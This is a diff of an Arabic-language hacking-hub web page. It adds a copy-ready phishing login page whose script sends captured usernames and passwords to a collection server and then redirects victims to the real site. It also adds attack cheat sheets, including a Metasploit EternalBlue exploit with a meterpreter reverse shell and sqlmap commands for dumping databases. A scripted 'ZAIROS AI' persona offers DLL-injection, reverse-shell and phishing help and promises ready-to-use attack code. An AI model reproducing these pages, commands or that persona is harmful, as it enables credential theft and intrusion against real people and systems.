+                </div>
+            </div>
+        </section>
+
+        <!-- HTML Section -->
+        <section id="html" class="section">
+            <div class="card">
+                <div class="card-title">HTML للـ Phishing</div>
+                <p>إنشاء صفحات Phishing احترافية لتقليد مواقع معروفة.</p>
+                
+                <div class="code-block" data-lang="HTML">
+                    <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                    <code>&lt;!-- Fake Login Page - صفحة تسجيل دخول مزيفة --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Secure Login&lt;/title&gt;
+    &lt;style&gt;
+        body { font-family: Arial; background: #f0f0f0; }
+        .login-box {
+            width: 300px;
+            margin: 100px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="login-box"&gt;
+        &lt;h2&gt;Secure Login&lt;/h2&gt;
+        &lt;form id="loginForm"&gt;
+            &lt;input type="text" id="username" placeholder="Username" required&gt;
+            &lt;input type="password" id="password" placeholder="Password" required&gt;
+            &lt;button type="submit"&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+    
+    &lt;script&gt;
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var data = {
+                user: document.getElementById('username').value,
+                pass: document.getElementById('password').value,
+                time: new Date().toISOString()
+            };
+            
+            // إرسال البيانات للخادم
+            fetch('https://your-server.com/collect', {
+                method: 'POST',
+                body: JSON.stringify(data)
+            }).then(() => {
+                // إعادة توجيه للموقع الحقيقي
+                window.location.href = 'https://real-site.com';
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code>
+                </div>
+            </div>
+        </section>
+
+        <!-- Tools Section -->
+        <section id="tools" class="section">
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Nmap Scanner</div>
+                    <p>أداة مسح المنافذ والشبكات</p>
+                    <div class="code-block" data-lang="BASH">
+                        <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                        <code># Scan all ports
+nmap -p- 192.168.1.1
+
+# Scan with service detection
+nmap -sV -sC 192.168.1.1
+
+# Aggressive scan
+nmap -A 192.168.1.1
+
+# Scan subnet
+nmap 192.168.1.0/24</code>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Metasploit</div>
+                    <p>إطار العمل الشهير للاختراق</p>
+                    <div class="code-block" data-lang="BASH">
+                        <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                        <code># Start Metasploit
+msfconsole
+
+# Search exploits
+search type:exploit name:windows
+
+# Use exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Set payload
+set payload windows/x64/meterpreter/reverse_tcp
+
+# Set options
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.5
+exploit</code>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">SQLMap</div>
+                    <p>أداة اختبار SQL Injection آلية</p>
+                    <div class="code-block" data-lang="BASH">
+                        <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                        <code># Basic scan
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Dump database
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Dump tables
+sqlmap -u "http://target.com/page.php?id=1" -D database --tables
+
+# Dump columns
+sqlmap -u "http://target.com/page.php?id=1" -D db -T users --columns</code>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">Wireshark</div>
+                    <p>محلل الشبكات والبروتوكولات</p>
+                    <div class="code-block" data-lang="BASH">
+                        <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+                        <code># Capture on interface
+sudo wireshark -i eth0
+
+# Capture filters
+tcp port 80
+host 192.168.1.1
+icmp
+
+# Display filters
+ip.addr == 192.168.1.1
+tcp.port == 443
+http.request.method == "POST"</code>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
 
-    <div class="grid">
-        <div class="card" onclick="location.href='hacking.html'">
-            <div class="card-icon">🎯</div>
-            <h3>أساسيات الاختراق</h3>
-            <p>بداية رحلتك في عالم الهكر والأنظمة المتقدمة</p>
+    <!-- AI Assistant -->
+    <div class="ai-container" id="aiChat">
+        <div class="ai-header">
+            <div class="ai-title">
+                <div class="ai-status"></div>
+                ZAIROS AI
+            </div>
+            <button class="ai-close" onclick="toggleChat()">×</button>
         </div>
-
-        <div class="card" onclick="location.href='lua.html'">
-            <div class="card-icon">🎮</div>
-            <h3>روبلوكس - Lua</h3>
-            <p>صناعة السكربتات، الغش، وتصميم الواجهات</p>
+        
+        <div class="lang-selector">
+            <button class="lang-btn active" onclick="setLang('ar')">العربية</button>
+            <button class="lang-btn" onclick="setLang('en')">English</button>
+            <button class="lang-btn" onclick="setLang('cpp')">C++</button>
+            <button class="lang-btn" onclick="setLang('java')">Java</button>
+            <button class="lang-btn" onclick="setLang('lua')">Lua</button>
+            <button class="lang-btn" onclick="setLang('html')">HTML</button>
         </div>
-
-        <div class="card" onclick="location.href='ai.html'">
-            <div class="card-icon">🤖</div>
-            <h3>المساعد الذكي</h3>
-            <p>برمجة بأي لغة: Lua, C++, C#, Java, HTML</p>
+        
+        <div class="ai-messages" id="aiMessages">
+            <div class="message ai-message">
+                مرحباً سيدي. أنا زايــروس AI، مساعدك الشخصي في عالم الاختراق. كيف يمكنني مساعدتك اليوم؟
+            </div>
         </div>
-
-        <div class="card" onclick="location.href='tools.html'">
-            <div class="card-icon">⚔️</div>
-            <h3>الأدوات المتقدمة</h3>
-            <p>أدوات مخصصة للاختراق والتلاعب</p>
+        
+        <div class="ai-input-container">
+            <input type="text" class="ai-input" id="aiInput" placeholder="اكتب سؤالك هنا..." onkeypress="handleKeyPress(event)">
+            <button class="ai-send" onclick="sendMessage()">إرسال</button>
         </div>
     </div>
 
-    <div class="ai-float" onclick="location.href='ai.html'">🤖</div>
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-logo">FR HUB</div>
+        <p style="color: var(--neon-red); margin-bottom: 10px;">⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️</p>
+        <p class="copyright">
+            © 2026 FR HUB | All Rights Reserved<br>
+            Developed by LORD ZAYRO<br>
+            <span style="color: #ff0000;">We are not responsible for any misuse of the information provided</span>
+        </p>
+    </footer>
 
-    <div class="footer">
-        FR HUB © 2025 - جميع الحقوق محفوظة<br>
-        تطوير: Lord Zayro | النخبة فقط
-    </div>
+    <script>
+        // Section Navigation
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // Copy Code Function
+        function copyCode(btn) {
+            const code = btn.nextElementSibling.innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'تم!';
+                setTimeout(() => btn.textContent = 'نسخ', 2000);
+            });
+        }
+
+        // AI Chat Functions
+        let currentLang = 'ar';
+        
+        function toggleChat() {
+            const chat = document.getElementById('aiChat');
+            chat.style.display = chat.style.display === 'none' ? 'flex' : 'none';
+        }
+
+        function setLang(lang) {
+            currentLang = lang;
+            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            const responses = {
+                'ar': 'تم تغيير اللغة للعربية. كيف يمكنني مساعدتك؟',
+                'en': 'Language switched to English. How can I assist you?',
+                'cpp': 'C++ mode activated. Ready for low-level programming assistance.',
+                'java': 'Java mode activated. Ready for cross-platform development.',
+                'lua': 'Lua mode activated. Ready for Roblox scripting.',
+                'html': 'HTML mode activated. Ready for web development.'
+            };
+            
+            addMessage(responses[lang], 'ai');
+        }
+
+        function handleKeyPress(e) {
+            if (e.key === 'Enter') sendMessage();
+        }
+
+        function sendMessage() {
+            const input = document.getElementById('aiInput');
+            const message = input.value.trim();
+            if (!message) return;
+            
+            addMessage(message, 'user');
+            input.value = '';
+            
+            // Simulate AI Response
+            setTimeout(() => {
+                const response = generateResponse(message, currentLang);
+                addMessage(response, 'ai');
+            }, 1000);
+        }
+
+        function addMessage(text, sender) {
+            const container = document.getElementById('aiMessages');
+            const msg = document.createElement('div');
+            msg.className = `message ${sender}-message`;
+            msg.textContent = text;
+            container.appendChild(msg);
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function generateResponse(msg, lang) {
+            const lower = msg.toLowerCase();
+            
+            // Roblox/Delta related
+            if (lower.includes('roblox') || lower.includes('delta') || lower.includes('lua')) {
+                if (lang === 'ar') {
+                    return 'لاستخدام Delta Executor: 1) حمل التطبيق 2) احصل على المفتاح 3) شغل السكربت. هل تريد كود محدد للطيران أو ESP؟';
+                }
+                return 'Delta Executor usage: 1) Download app 2) Get key 3) Execute script. Need specific fly or ESP code?';
+            }
+            
+            // C++ related
+            if (lower.includes('c++') || lower.includes('inject') || lower.includes('dll')) {
+                if (lang === 'ar') {
+                    return 'لحقن DLL استخدم CreateRemoteThread مع LoadLibraryA. تأكد من صلاحيات Administrator. هل تريد كود Memory Scanner؟';
+                }
+                return 'For DLL injection use CreateRemoteThread with LoadLibraryA. Ensure Administrator privileges. Want Memory Scanner code?';
+            }
+            
+            // Java related
+            if (lower.includes('java')) {
+                if (lang === 'ar') {
+                    return 'Java ممتازة لـ Reverse Shells وبرمجة Android. استخدم Socket للاتصال العكسي. هل تريد مثال؟';
+                }
+                return 'Java is excellent for Reverse Shells and Android. Use Socket for reverse connections. Want an example?';
+            }
+            
+            // HTML/Phishing
+            if (lower.includes('html') || lower.includes('phish')) {
+                if (lang === 'ar') {
+                    return 'لإنشاء صفحة Phishing: انسخ CSS الموقع الأصلي، استخدم fetch لإرسال البيانات، ثم redirect للموقع الحقيقي.';
+                }
+                return 'For phishing: Copy original site CSS, use fetch to send data, then redirect to real site.';
+            }
+            
+            // Default responses
+            const defaults = {
+                'ar': 'أنا زايــروس AI، خبير الأمن السيبراني. اسألني عن Roblox Lua, C++, Java, أو HTML. سأقدم لك أكواد جاهزة للاستخدام.',
+                'en': 'I am ZAIROS AI, cybersecurity expert. Ask me about Roblox Lua, C++, Java, or HTML. I will provide ready-to-use code.',
+                'cpp': 'ZAIROS AI: Include <windows.h> for Windows API. Use OpenProcess with PROCESS_ALL_ACCESS. Need specific injection code?',
+                'java': 'ZAIROS AI: Use java.net.Socket for networking. Runtime.exec() for command execution. Need reverse shell template?',
+                'lua': 'ZAIROS AI: Use game:GetService("Players") for player access. hookfunction for function hooking. Need fly script?',
+                'html': 'ZAIROS AI: Use form event listeners to capture data. Fetch API to exfiltrate. Need phishing page template?'
+            };
+            
+            return defaults[lang] || defaults['en'];
+        }
+
+        // Add glitch effect randomly
+        setInterval(() => {
+            const logo = document.querySelector('.logo');
+            logo.style.animation = 'none';
+            setTimeout(() => {
+                logo.style.animation = 'glitch 0.3s';
+            }, 10);
+        }, 5000);
+    </script>
 </body>
 </html>
